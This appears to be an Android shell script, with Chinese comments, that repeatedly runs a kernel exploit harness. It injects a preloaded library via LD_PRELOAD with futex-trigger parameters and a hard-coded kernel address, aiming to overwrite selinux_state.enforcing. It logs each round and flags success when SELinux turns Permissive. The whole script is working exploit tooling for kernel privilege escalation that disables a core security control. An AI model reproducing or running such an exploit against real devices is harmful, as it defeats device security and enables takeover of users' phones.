#!/system/bin/sh
# mt26: 写目标 = selinux_state.enforcing (0x2a41b98, tree_pc=0x2a41b90)
# 期望: getenforce → Permissive (enforcing byte0 = 0)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt25.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt26_selinux.txt
RUNLOG=/data/local/tmp/mt26_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
echo "enforce_before=$(getenforce 2>/dev/null || cat /sys/fs/selinux/enforce 2>/dev/null)" >> $LOG
am kill-all 2>&1 | tail -1
echo "=== 5 轮独立进程 ==="
for R in 1 2 3 4 5; do
  echo "--- round $R start $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 220 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a41b90 \
    PSELECT_TREE_LEFT=0 \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 180 > $RUNLOG 2>&1
  echo "round=$R rc=$?" >> $LOG
  grep -a 'mt25:\|WRITE PRIMITIVE\|futex trigger\|bad leaked' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  EF=$(getenforce 2>/dev/null || cat /sys/fs/selinux/enforce 2>/dev/null)
  echo "round=$R enforce=$EF" >> $LOG
  case "$EF" in
    *ermissive*|*0*) echo "★★★ SELINUX PERMISSIVE round=$R ★★★" >> $LOG; break;;
  esac
  sleep 3
done
echo "=== enforce_after=$(getenforce 2>/dev/null || cat /sys/fs/selinux/enforce 2>/dev/null)" >> $LOG
echo "=== DONE ===" >> $LOG
